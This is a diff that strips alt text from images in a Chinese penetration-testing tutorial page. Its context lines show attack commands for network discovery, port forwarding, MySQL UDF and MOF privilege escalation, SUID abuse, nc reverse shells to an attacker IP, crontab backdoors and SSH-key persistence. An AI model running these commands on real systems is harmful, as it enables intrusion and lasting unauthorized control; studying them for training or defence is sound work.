@@ -671,7 +671,7 @@
 </li>
 <li>使用netdiscover扫描(arp扫描工具，既可以主动扫描也可以被动嗅探)<ul>
 <li><code>netdiscover -i eth0 -r 目标IP</code></li>
-<li><img src="https://storage.tttang.com/media/attachment/2022/10/29/e8b86246-4805-4a90-8563-0fc49b5dbbb5.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/e8b86246-4805-4a90-8563-0fc49b5dbbb5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></li>
+<li><img src="https://storage.tttang.com/media/attachment/2022/10/29/e8b86246-4805-4a90-8563-0fc49b5dbbb5.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/e8b86246-4805-4a90-8563-0fc49b5dbbb5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li>
 <li>参数说明:-i:指定一个接口;-r∶指定扫描范围<ul>
 <li>注意: netdiscover时间越久越精确，可以发现某一台主机在一段时间内介入了那些网段，从而发现其他新的网段地址</li>
 </ul>
@@ -680,7 +680,7 @@
 </li>
 <li>用nbtscan工具进行快速扫描存活PC端，同时获得NETBIOS(windows往上输入输出服务,139端口)<ul>
 <li><code>nbtscan -r 目标IP</code></li>
-<li><img src="https://storage.tttang.com/media/attachment/2022/10/29/18af01a4-bc60-4d74-86a9-98bdffa39b1c.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/18af01a4-bc60-4d74-86a9-98bdffa39b1c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></li>
+<li><img src="https://storage.tttang.com/media/attachment/2022/10/29/18af01a4-bc60-4d74-86a9-98bdffa39b1c.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/18af01a4-bc60-4d74-86a9-98bdffa39b1c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li>
 </ul>
 </li>
 </ol>
@@ -689,7 +689,7 @@
 <ul>
 <li>nmap探测：<code>nmap -Pn -n 目标IP</code>（禁ping扫描)</li>
 <li>masscan扫描：<code>masscan -p 端口号 目标IP地址 --rate=10000</code> #用10kpps速度扫描端口</li>
-<li><img src="https://storage.tttang.com/media/attachment/2022/10/29/e102c14c-fd01-4f8f-83f9-989c0bab605d.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/e102c14c-fd01-4f8f-83f9-989c0bab605d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></li>
+<li><img src="https://storage.tttang.com/media/attachment/2022/10/29/e102c14c-fd01-4f8f-83f9-989c0bab605d.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/e102c14c-fd01-4f8f-83f9-989c0bab605d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li>
 </ul>
 </li>
 <li><p>探测目标操作系统</p>
@@ -697,7 +697,7 @@
 <li><p>使用NSE脚本: <code>nmap --script smb-os-discovery.nse -p 445 目标IP地址</code></p>
 <ul>
 <li>其中: smb-os-discovery.nse脚本通过smb来探测操作系统版本、计算机名、工作组名、域名等等信息。–script指定脚本</li>
-<li><img src="https://storage.tttang.com/media/attachment/2022/10/29/35dde4b7-fb3d-440a-b6f9-1b88a19de252.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/35dde4b7-fb3d-440a-b6f9-1b88a19de252.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></li>
+<li><img src="https://storage.tttang.com/media/attachment/2022/10/29/35dde4b7-fb3d-440a-b6f9-1b88a19de252.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/35dde4b7-fb3d-440a-b6f9-1b88a19de252.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li>
 </ul>
 </li>
 <li><p>使用nmap -O探测操作系统版本<br><code>nmap -O 目标IP</code></p>
@@ -894,7 +894,7 @@
 <li><p><strong>last命令</strong></p>
 <ul>
 <li>用于查看系统所有近期登录记录。</li>
-<li>执行last命令时，会读取&#x2F;var&#x2F;log&#x2F;wtmp的文件。<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/be0bdb4e-2582-4010-8246-34b3f959c917.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/be0bdb4e-2582-4010-8246-34b3f959c917.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></li>
+<li>执行last命令时，会读取&#x2F;var&#x2F;log&#x2F;wtmp的文件。<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/be0bdb4e-2582-4010-8246-34b3f959c917.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/be0bdb4e-2582-4010-8246-34b3f959c917.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li>
 <li>用户名 终端位置 登录IP或者内核 开始时间 结束时间</li>
 <li>如果是系统漏洞提权，不属于登录，无记录</li>
 </ul>
@@ -953,7 +953,7 @@
 <li>内网转发的目的</li>
 </ul>
 <blockquote>
-<p>理论上通过网络连接的计算机都是可以互相访问的，但是因为技术原因没有实现。如局域网中某计算机仅开放web服务，则只能内网使用，外网无法直接访问。要让外网用户直接访问局域网服务，必须进行内网转发等操作<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/8da8788c-be83-4362-a021-8414f20b8fa9.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/8da8788c-be83-4362-a021-8414f20b8fa9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></p>
+<p>理论上通过网络连接的计算机都是可以互相访问的，但是因为技术原因没有实现。如局域网中某计算机仅开放web服务，则只能内网使用，外网无法直接访问。要让外网用户直接访问局域网服务，必须进行内网转发等操作<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/8da8788c-be83-4362-a021-8414f20b8fa9.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/8da8788c-be83-4362-a021-8414f20b8fa9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 </blockquote>
 <ul>
 <li><p>内网转发原理<br>通过服务器进行中转，将内部的<strong>端口映射到公网IP</strong>上，或者将内网端口<strong>转发至外部服务器</strong>。</p>
@@ -1003,7 +1003,7 @@
 <p>四种情况有不同拿下服务器的方式</p>
 <h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><ul>
 <li>原理<br>端口转发是转发一个<strong>网络端口</strong>从<strong>一个网络节点到另一个网络节点</strong>的行为。使一个外部用户从外部经过一个被激活的NAT路由器到达一个在私有内部IP地址(局域网内部）上的一个端口。<br>简单地说︰端口转发就是将一个端口（这个端口可以本机的端口，也可以是本机可以访问到的任意主机的端口）转发到<strong>任意一台可以访问到的IP</strong>上，通常这个IP是公网ip</li>
-<li>端口转发场景∶<br>外网主机A已经可以任意连接内网主机B上的端口，但是无法访问内网主机C上的端口<br>此时可以将C主机的端口转发到B主机的端口，那么外网主机A访问B主机的某某端口就相当于访问了C主机的某某端口<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/d6a37fdf-34be-4c25-8d13-9c30d6f6b7fc.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/d6a37fdf-34be-4c25-8d13-9c30d6f6b7fc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></li>
+<li>端口转发场景∶<br>外网主机A已经可以任意连接内网主机B上的端口，但是无法访问内网主机C上的端口<br>此时可以将C主机的端口转发到B主机的端口，那么外网主机A访问B主机的某某端口就相当于访问了C主机的某某端口<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/d6a37fdf-34be-4c25-8d13-9c30d6f6b7fc.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/d6a37fdf-34be-4c25-8d13-9c30d6f6b7fc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li>
 </ul>
 <h3 id="端口转发工具"><a href="#端口转发工具" class="headerlink" title="端口转发工具"></a>端口转发工具</h3><h4 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h4><blockquote>
 <p>lcx是一个居于socket套接字实现的端口转发工具，有windows和linux两个版本，windows叫lcx.exe,linux叫portmap<br>一个正常的socket隧道必须具备两端：服务器端和客户端</p>
@@ -1018,7 +1018,7 @@
 <ul>
 <li><p>本地端口映射:如果目标服务器由于防火墙的限制，部分端口的数据无法通过防火墙，可以将目标服务器相应端口的数据传到<strong>防火墙允许的其他端口</strong><br><code>lcx.exe -tran 映射端口号 目标ip 目标端口</code></p>
 </li>
-<li><p>内网端口转发：如下规则时，主机不能直接访问内网，这时就需要web服务器当<strong>跳板</strong>，也就是<strong>代理</strong>来使攻击机访问到内网主机<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/210124f1-baf9-436a-93c8-f7fd2ef87421.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/210124f1-baf9-436a-93c8-f7fd2ef87421.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"><br>基本命令：<br>·转发端口<code>lcx.exe -slave 公网ip 端口 内网ip 端口</code><br>·监听端口<code>lcx.exe -listen 转发端口 本机任意没有被占用端口</code></p>
+<li><p>内网端口转发：如下规则时，主机不能直接访问内网，这时就需要web服务器当<strong>跳板</strong>，也就是<strong>代理</strong>来使攻击机访问到内网主机<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/210124f1-baf9-436a-93c8-f7fd2ef87421.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/210124f1-baf9-436a-93c8-f7fd2ef87421.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"><br>基本命令：<br>·转发端口<code>lcx.exe -slave 公网ip 端口 内网ip 端口</code><br>·监听端口<code>lcx.exe -listen 转发端口 本机任意没有被占用端口</code></p>
 </li>
 </ul>
 <blockquote>
@@ -1123,18 +1123,18 @@
 <ol>
 <li><p>pip install安装</p>
 </li>
-<li><p>假设服务器是php版本，将regeorg里的php上传到服务器，直接访问显示”georg says,’all seems fine’”，为正常运行<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/1937af61-ef7b-46ef-9a2b-2c44da3cc586.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/1937af61-ef7b-46ef-9a2b-2c44da3cc586.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></p>
+<li><p>假设服务器是php版本，将regeorg里的php上传到服务器，直接访问显示”georg says,’all seems fine’”，为正常运行<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/1937af61-ef7b-46ef-9a2b-2c44da3cc586.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/1937af61-ef7b-46ef-9a2b-2c44da3cc586.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 </li>
 <li><p>终端下运行:<code>python reGeorgSocksProxy.py -u 靶机reGeorg脚本地址 -p 本地监听端口</code></p>
 </li>
-<li><p>再起一个终端修改proxychains.conf配置文件，删除dynamic_chain的注释，在ProxyList最后加一行<code>socks5 127.0.0.1 本地监听端口</code>，并把其他的注释<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/86acdd55-5931-45f2-a10b-7c09d7eb41d5.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/86acdd55-5931-45f2-a10b-7c09d7eb41d5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></p>
+<li><p>再起一个终端修改proxychains.conf配置文件，删除dynamic_chain的注释，在ProxyList最后加一行<code>socks5 127.0.0.1 本地监听端口</code>，并把其他的注释<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/86acdd55-5931-45f2-a10b-7c09d7eb41d5.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/86acdd55-5931-45f2-a10b-7c09d7eb41d5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>代理就配置好了</p>
 </li>
 <li><p>使用<code>proxychains 命令</code>，流量会自动从配置文件端口经过(python跑的脚本终端别关)</p>
 </li>
 </ol>
 <p>但是在msf外配置的代理,msf内部流量是不会走代理过的</p>
-<h2 id="msf-route"><a href="#msf-route" class="headerlink" title="msf route"></a>msf route</h2><p>msf框架中自带路由转发功能，在已经获取meterpreter shell的基础上添加一条去往内网的路由<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/67351477-e0eb-4cf7-a460-01505220b4f7.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/67351477-e0eb-4cf7-a460-01505220b4f7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"><br>路由添加： <code>run autoroute -s 内网网端</code><br><code>run autoroute -p</code> 查看路由添加情况</p>
+<h2 id="msf-route"><a href="#msf-route" class="headerlink" title="msf route"></a>msf route</h2><p>msf框架中自带路由转发功能，在已经获取meterpreter shell的基础上添加一条去往内网的路由<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/67351477-e0eb-4cf7-a460-01505220b4f7.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/67351477-e0eb-4cf7-a460-01505220b4f7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"><br>路由添加： <code>run autoroute -s 内网网端</code><br><code>run autoroute -p</code> 查看路由添加情况</p>
 <h2 id="proxifiler"><a href="#proxifiler" class="headerlink" title="proxifiler"></a>proxifiler</h2><p>proxifiler为windows客户端代理工具，<strong>socks5客户端</strong>，可以让不支持通过代理服务器工作的程序通过https或socks5代理或代理链</p>
 <ul>
 <li>支持socks4\socks5\http\tcp\udp。有gui<br>使用:profil配置代理ip和端口。proxification rules设置代理规则，不需要代理的设为direct模式</li>
@@ -1210,7 +1210,7 @@
 <li>上传mof文件</li>
 <li>执行load_file和into dumpfile将文件导出到指定位置<br><code>select load_file(&#39;mof目标路径&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;</code></li>
 </ol>
-<p>nullevt.mof文件的内容<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/5b6b0a85-f8ae-48be-9f1d-6745b4226db6.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/5b6b0a85-f8ae-48be-9f1d-6745b4226db6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></p>
+<p>nullevt.mof文件的内容<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/5b6b0a85-f8ae-48be-9f1d-6745b4226db6.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/5b6b0a85-f8ae-48be-9f1d-6745b4226db6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 </blockquote>
 <h4 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h4><ul>
 <li><p>原理：UDF(user defined function)用户自定义函数通过添加新函数，对mysql服务器进行功能扩充，将mysql账号转化为system权限。</p>
@@ -1406,9 +1406,9 @@
 <li>完成后，销毁firefart密码文件即可恢复root<br><code>mv /tmp/passwd.bak /etc/passwd</code></li>
 </ol>
 <p>获取shell后将shell转换为完全交互式的TTY：<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
-<h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>此处涉及权限划分的知识。在Linux中通过权限位rwx实现文件权限管理。d目录，-普通文件。r read;w write;x execute<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/34a39b9b-d6ee-46d4-b30c-e1541d6bd09a.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/34a39b9b-d6ee-46d4-b30c-e1541d6bd09a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"><br>所有者-所属者-其他用户</p>
+<h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>此处涉及权限划分的知识。在Linux中通过权限位rwx实现文件权限管理。d目录，-普通文件。r read;w write;x execute<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/34a39b9b-d6ee-46d4-b30c-e1541d6bd09a.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/34a39b9b-d6ee-46d4-b30c-e1541d6bd09a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"><br>所有者-所属者-其他用户</p>
 <ul>
-<li>suid作用于二进制可执行程序上，当执行程序时会临时切换身份为文件所有者身份为文件所有者身份。<br><code>chmod u+s FILE\chmod 4755 FILE</code> 添加SUID权限到二进制文件（在三位数据权限前，4代表添加到SUID位）<br><code>chmod u-s FILE\chmod 0xxx FILE</code> 删除suid<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/80b68f50-42f7-4a7a-aea3-ff233dc22f79.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/80b68f50-42f7-4a7a-aea3-ff233dc22f79.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></li>
+<li>suid作用于二进制可执行程序上，当执行程序时会临时切换身份为文件所有者身份为文件所有者身份。<br><code>chmod u+s FILE\chmod 4755 FILE</code> 添加SUID权限到二进制文件（在三位数据权限前，4代表添加到SUID位）<br><code>chmod u-s FILE\chmod 0xxx FILE</code> 删除suid<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/80b68f50-42f7-4a7a-aea3-ff233dc22f79.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/80b68f50-42f7-4a7a-aea3-ff233dc22f79.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li>
 <li>文件属主为s表示设置了suid.没有x权限用大写S，表示权限无效</li>
 </ul>
 <p>简而言之，任何用户执行有suid的文件时，都会以第一个权限运行</p>
@@ -1422,7 +1422,7 @@
 <ul>
 <li>环境要求：配置中secure_file_priv&#x3D;””，<br>mysql具有root权限，具有sql语句执行权限，目录可读可写，selinux关闭</li>
 </ul>
-<p>先获取低权限shell,提权过程：<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/f70d3b9a-84a7-46e5-be32-45cf0a28b84b.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/f70d3b9a-84a7-46e5-be32-45cf0a28b84b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></p>
+<p>先获取低权限shell,提权过程：<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/f70d3b9a-84a7-46e5-be32-45cf0a28b84b.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/f70d3b9a-84a7-46e5-be32-45cf0a28b84b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <ol>
 <li>查看plugin目录路径 <code>show variables like &#39;%plugin%&#39;;</code><br><code>select unhex(&#39;udf十六进制&#39;) into dumpfile &#39;usr/lib64/mysql/plugin/1.so&#39;;</code> (plugin路径&#x2F;1.so)</li>
 <li>声明函数 <code>create function sys_eval returns string soname &#39;1.so&#39;;</code></li>
@@ -1437,7 +1437,7 @@
 <ul>
 <li><p>语法:<code>nc [-hlnruz][-g 网关][-G 指向器数目][-i 延迟秒数][-o 输出文件][-p 通信端口][-s 来源IP][-v 次数][-w 超时秒数][主机名称][通信端口...]</code></p>
 </li>
-<li><p>反向shell<br>假设在目标主机找到了RCE漏洞，可以在目标主机上用nc发出命令启动反向shell<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/082a3402-fa0e-4082-8637-b1d5e8492103.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/082a3402-fa0e-4082-8637-b1d5e8492103.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></p>
+<li><p>反向shell<br>假设在目标主机找到了RCE漏洞，可以在目标主机上用nc发出命令启动反向shell<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/082a3402-fa0e-4082-8637-b1d5e8492103.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/082a3402-fa0e-4082-8637-b1d5e8492103.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 </li>
 </ul>
 <ol>
@@ -1445,7 +1445,7 @@
 <li>靶机命令，连接攻击机的监听端口<code>nc 攻击机ip 监听端口号 -e /bin/bash</code> #linux<br><code>nc 攻击机ip 监听端口号 -e c:\windows\system32\cmd.exe</code> #windows<br>-e:将bash shell 发回主机</li>
 </ol>
 <ul>
-<li>正向shell<br>正向shell时在目标机使用nc将bash shell绑定到特定端口，攻击机nc连接到此端口<br> <img src="https://storage.tttang.com/media/attachment/2022/10/29/09a20387-a532-4ea8-9c1a-0c5c8a640cf9.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/09a20387-a532-4ea8-9c1a-0c5c8a640cf9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></li>
+<li>正向shell<br>正向shell时在目标机使用nc将bash shell绑定到特定端口，攻击机nc连接到此端口<br> <img src="https://storage.tttang.com/media/attachment/2022/10/29/09a20387-a532-4ea8-9c1a-0c5c8a640cf9.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/09a20387-a532-4ea8-9c1a-0c5c8a640cf9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li>
 </ul>
 <h3 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a><strong>bash反弹shell</strong></h3><p>目标主机可能没有nc或不支持-e参数时，就需要以下方式反弹shell</p>
 <ul>
@@ -1484,7 +1484,7 @@
 
 <p>perl和python绝大多数服务器都会装，所以很有用</p>
 <p>以某次内网渗透为实例</p>
-<h2 id="横向渗透预备工作"><a href="#横向渗透预备工作" class="headerlink" title="横向渗透预备工作"></a>横向渗透预备工作</h2><p><img src="https://storage.tttang.com/media/attachment/2022/10/29/1636427f-bf91-4ce2-98da-c3c39213063f.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/1636427f-bf91-4ce2-98da-c3c39213063f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png">假设是如上拓扑图。先无视防火墙，内网机器无法直接访问外网，必须要走边界机。</p>
+<h2 id="横向渗透预备工作"><a href="#横向渗透预备工作" class="headerlink" title="横向渗透预备工作"></a>横向渗透预备工作</h2><p><img src="https://storage.tttang.com/media/attachment/2022/10/29/1636427f-bf91-4ce2-98da-c3c39213063f.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/1636427f-bf91-4ce2-98da-c3c39213063f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">假设是如上拓扑图。先无视防火墙，内网机器无法直接访问外网，必须要走边界机。</p>
 <h3 id="获得低权限shell"><a href="#获得低权限shell" class="headerlink" title="获得低权限shell"></a>获得低权限shell</h3><ul>
 <li>在网站信息搜集看到是joomla模板</li>
 <li>msf里search joomla <strong>查看</strong> 辅助模块auxiliar里的<strong>扫描脚本</strong>：<code>auxiliary/scannner/http/joomla_version</code></li>
@@ -1529,7 +1529,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port=7100</span><br></pre></td></tr></table></figure>
 
 <p>这里，我要强调本文的精华</p>
-<h4 id="x3D-x3D-frp端口转发与内网穿透-x3D-x3D"><a href="#x3D-x3D-frp端口转发与内网穿透-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;frp端口转发与内网穿透&#x3D;&#x3D;"></a>&#x3D;&#x3D;frp端口转发与内网穿透&#x3D;&#x3D;</h4><p><img src="https://storage.tttang.com/media/attachment/2022/10/29/f4087477-330a-4eef-acf2-0b6b27097858.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/f4087477-330a-4eef-acf2-0b6b27097858.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></p>
+<h4 id="x3D-x3D-frp端口转发与内网穿透-x3D-x3D"><a href="#x3D-x3D-frp端口转发与内网穿透-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;frp端口转发与内网穿透&#x3D;&#x3D;"></a>&#x3D;&#x3D;frp端口转发与内网穿透&#x3D;&#x3D;</h4><p><img src="https://storage.tttang.com/media/attachment/2022/10/29/f4087477-330a-4eef-acf2-0b6b27097858.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/f4087477-330a-4eef-acf2-0b6b27097858.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p><strong>还是这张图。对于外网kali访问内网机，有两种手法，一是把外网kali的端口转发至边界机的端口。这样数据发到边界机的该端口就相当于发到外网kali，而端口转发frps在边界机、frpc在外网kali。另一种方式是内网穿透，把内网流量直接穿透到外网使得内网机能上网，frps也在边界机，frpc在内网机。</strong></p>
 <p>可以理解为都是端口转发，<strong>访问frps所在主机就相当于访问frpc</strong>，所以<strong>frps一定要在中间的机器上</strong>。逻辑理不通建议反复读来回读读通读透。有很多文章啊就不介绍端口转发和内网穿透有什么区别，整半天都不知道frps放哪，虽然只学内网穿透就够外网打内网一招鲜了。</p>
 <p>上传frp和ini文件，运行。重新msfvenome生成一个reverse木马，lhost指向边界机 lport也是边界机要开的端口。(木马的lhost指的是需要连接的ip,不是指上传的ip)<br>上传木马到二层边界机运行，再在边界机shell里开监听(监听msf木马lport)</p>
@@ -1630,7 +1630,7 @@
 <li>计划任务后门(crontab后门)</li>
 </ul>
 <blockquote>
-<p>crontab命令介绍<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/c4aaefea-6fc3-436f-b6fa-4773a2e3d455.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/c4aaefea-6fc3-436f-b6fa-4773a2e3d455.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></p>
+<p>crontab命令介绍<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/c4aaefea-6fc3-436f-b6fa-4773a2e3d455.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/c4aaefea-6fc3-436f-b6fa-4773a2e3d455.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <ul>
 <li><p>crontab命令用来管理用户需要周期执行的任务。等于windows计划任务。crond进程每分钟会定期检查是否有要执行的任务，如果有则自动执行<br>通常在计划任务中添加后门，或者替换服务进程，以及反弹shell</p>
 </li>
@@ -1661,7 +1661,7 @@
 </blockquote>
 <blockquote>
 <ol start="2">
-<li>将攻击机.ssh目录下的id_rsa.pub复制到目标服务器的<code>/root/.ssh/authorized_key</code>文件里<br><code>scp ~/.ssh/id_rsa.pub root@目标服务器IP地址:/root/.ssh/authorized_keys</code><br><img src="https://storage.tttang.com/media/attachment/2022/10/29/e20a4428-9299-4617-9f82-0bf3d3848656.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/e20a4428-9299-4617-9f82-0bf3d3848656.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></li>
+<li>将攻击机.ssh目录下的id_rsa.pub复制到目标服务器的<code>/root/.ssh/authorized_key</code>文件里<br><code>scp ~/.ssh/id_rsa.pub root@目标服务器IP地址:/root/.ssh/authorized_keys</code><br><img src="https://storage.tttang.com/media/attachment/2022/10/29/e20a4428-9299-4617-9f82-0bf3d3848656.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/e20a4428-9299-4617-9f82-0bf3d3848656.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li>
 <li>在目标服务器中，将authorized_keys权限改为600<br><code>chmod 600 /root/.ssh/authorized.keys</code></li>
 <li>尝试免密登录</li>
 </ol>
